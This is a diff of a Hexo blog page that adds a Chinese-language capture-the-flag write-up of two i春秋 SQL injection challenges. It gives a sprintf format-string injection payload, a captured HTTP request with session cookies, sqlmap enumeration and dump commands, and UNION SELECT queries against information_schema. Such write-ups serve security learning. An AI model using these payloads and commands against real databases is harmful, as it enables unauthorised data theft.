@@ -24,7 +24,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>tags - i春秋 web - Hexo</title>
+<title>sql - Hexo</title>
 
 <meta name="keywords" content>
 
@@ -112,21 +112,9 @@
 
             <div class="page-title">
     <ul>
-        <li class>
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class>
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
         
-        <li class>
-            <a href="/categories/humanities" data-name="人文">人文</a>
-        </li>
-        
-        <li class>
-            <a href="/categories/others" data-name="其他">其他</a>
-        </li>
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -138,44 +126,59 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
-            
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://shuoit.net" target="_blank">
-                <strong>纠结伦</strong>
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://shuoit.net" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://shuoit.net" target="_blank">纠结伦</a>
+                    <span title="Last edited at&nbsp;2019-05-20">2019-05-20</span>
+                </p>
+                <p>一个搬🧱的劳斯基😁️️</p>
+            </div>
+            <h2 class="post-title">sql</h2>
+            <div class="post-meta">
+                emm... 1942 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>这道题学会了sqlmap的一种新方法，把sqlmap和burp suite结合起来一起使用。<br>首先这道题的注入方法也第一次见到。<br>尝试admin%，会报错，说sprintf（）的错误，后来仔细在网上看了关于这个函数的注入漏洞，具体原理如下：<br><a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a><br>所以这代替构造username=admin%1$\’ and 1=2# 与 username=admin%1$\’ and 1=1#<br>可以看到结果不同。然后用让username=admin%1$’来进行抓包，然后bp抓包，将post放入一个txt文档中，如下：<br>POST / HTTP/1.1<br>Host: 5d32bb5b03334ab389ab2633c7f51fc50ba90ac163ec4c39.changame.ichunqiu.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://5d32bb5b03334ab389ab2633c7f51fc50ba90ac163ec4c39.changame.ichunqiu.com/" target="_blank" rel="noopener">http://5d32bb5b03334ab389ab2633c7f51fc50ba90ac163ec4c39.changame.ichunqiu.com/</a><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 40<br>DNT: 1<br>Connection: close<br>Cookie: pgv_pvi=1301972992; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1558185087,1558245844,1558273051,1558277967; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; browse=CFlZTxUYU0BfUFtGVQJTRFBZSkdeQFBYWVZFRFlRWExTVlhPWkZLThQ; ci_session=dcde387fe158e37c1eb3d0bcf6aa4b5ba2d0eace; __jsluid=ca9645f0a985b2bc01ba82337d6060ba; pgv_si=s9517548544; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1558277981<br>Upgrade-Insecure-Requests: 1</p>
+<p>username=admin+%251%24%27&amp;password=12345</p>
+<p>然后用sqlmap爆破：<br>python sqlmap.py -r “D:\sqlmap.txt” -p username –level 3 –dbs –thread 10<br><img src="/2019/05/20/sql/sql-806784be.png" alt><br>表名：python sqlmap.py -r “D:\sqlmap.txt” -p username –tables -D ctf<br><img src="/2019/05/20/sql/sql-1506fb07.png" alt><br>列名：python sqlmap.py -r “D:\sqlmap.txt” -p username -columns -D ctf -T flag<br><img src="/2019/05/20/sql/sql-f1839439.png" alt><br>结果：python sqlmap.py -r “D:\sqlmap.txt” -p username –dump -D ctf -T flag -C flag<br><img src="/2019/05/20/sql/sql-8710280e.png" alt></p>
+<h2 id="phonenumber"><a href="#phonenumber" class="headerlink" title="phonenumber"></a>phonenumber</h2><p>这道题的特色为在电话那里进行爆破，并且要将爆破语句转换成为16进制，最后报数据的时候要注意flag在admin的phone中，题目的源码中给了提示。。<br>1 union select database()<br><img src="/2019/05/20/sql/sql-90ded8c6.png" alt><br>1 union select table_name from information_schema.tables where table_schema=database()<br><img src="/2019/05/20/sql/sql-c6cbef06.png" alt><br>1 union select column_name from information_schema.columns where table_name=”user”<br><img src="/2019/05/20/sql/sql-f2f415e3.png" alt><br>1 union select phone from user where username=”admin”<br><img src="/2019/05/20/sql/sql-421e2d9c.png" alt></p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2019-05-17
-            
         </div>
-        <a class="post-title" href="/2019/05/17/notebook/" target="_blank" title="notebook">notebook</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://yoursite.com/tags/i春秋-web/" target="_blank">i春秋 web</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        notebook
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/ctf-i春秋/">ctf i春秋</a>
+            
+        </div>
+        
+    </article>
     
+    <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+
+    
+
 </div>
+<script src="/js/busuanzi.pure.mini.js"></script>
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about" title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
